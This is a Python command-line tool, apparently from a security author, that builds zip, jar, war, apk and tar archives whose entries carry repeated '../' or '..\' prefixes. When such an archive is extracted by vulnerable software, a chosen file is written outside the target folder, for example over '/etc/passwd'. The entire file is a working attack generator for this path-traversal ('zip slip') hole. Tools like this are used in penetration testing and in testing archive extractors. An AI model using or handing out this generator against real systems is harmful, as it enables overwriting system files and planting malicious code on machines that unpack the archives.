#!/usr/bin/env python
# Author: Alamot
import os
import sys
import zipfile
import tarfile
import argparse


mode = {".zip":"a", ".jar":"a", ".war":"a", ".apk":"a",
        ".tar":"a", ".gz":"w:gz", ".tgz":"w:gz", ".bz2":"w:bz2"}


def make_traversal_path(path, level=0, os="unix"):
    if os == "win":
        traversal = ".." + "\\"
        fullpath = traversal*level + path
        return fullpath.replace('/', '\\').replace('\\\\', '\\') 
    else:
        traversal = ".." + "/"
        fullpath = traversal*level + path
        return fullpath.replace('\\', '/').replace('//', '/')


def main():
    parser = argparse.ArgumentParser(description="A tool to create archives " +
    "containing path-traversal filenames (e.g. '../../etc/passwd').")
    parser.add_argument("file_to_add", help="File to add in the archive.")
    parser.add_argument("archive",
                        help="Archive filename (Supported extensions are " +
                             ".zip, .jar, .war, .apk, " +
                             ".tar, .tar.bz2, .tar.gz, .tgz).")
    parser.add_argument("-l", "--levels", dest="levels", default="0-10",
                        help="A single level or a range of levels to " +
                        "traverse (default: %(default)s).")
    parser.add_argument("-o", "--os", dest="os", default="unix",
                        help="Target OS [unix|win] (default: %(default)s).")
    parser.add_argument("-p", "--path", dest="path", default="",
                        help="Path to include (e.g. 'etc/').")
    args = parser.parse_args()

    if not os.path.exists(args.file_to_add):
        sys.exit("Cannot find input file: " + args.file_to_add)

    name, ext = os.path.splitext(args.archive)
    if not ext:
        sys.exit("Please specify a supported extention (zip, jar, " +
                 "tar, tar.bz2, tar.gz, tgz) in the archive filename: " +
                 args.archive)

    try:
        if "-" not in args.levels:
            start = int(args.levels)
            end = int(args.levels) + 1
        else:
            start, end = args.levels.split("-")
            start = int(start)
            end = int(end) + 1
    except ValueError:
        sys.exit("Please specify a single level (e.g. 3) or " +
                 "a level range (e.g. 1-10) for path traversal.")

    path = args.path + os.path.basename(args.file_to_add)

    if ext in [".zip", ".jar", ".war", ".apk"]:
        print("Creating archive " + args.archive)
        zipf = zipfile.ZipFile(args.archive, mode[ext])
        for i in range(start, end):
            fullpath = make_traversal_path(path, level=i, os=args.os)
            print("[+] Adding " + fullpath)
            zipf.write(args.file_to_add, fullpath)
        zipf.close()
    elif ext in [".tar", ".bz2", ".gz", ".tgz"]:
        print("Creating archive " + args.archive)
        tarf = tarfile.open(args.archive, mode[ext])
        for i in range(start, end):
            fullpath = make_traversal_path(path, level=i, os=args.os)
            print("[+] Adding " + fullpath)
            tarf.add(args.file_to_add, fullpath)
        tarf.close()
    else:
        sys.exit("Extention '" + ext + "' not supported.")


if __name__ == '__main__':
    main()
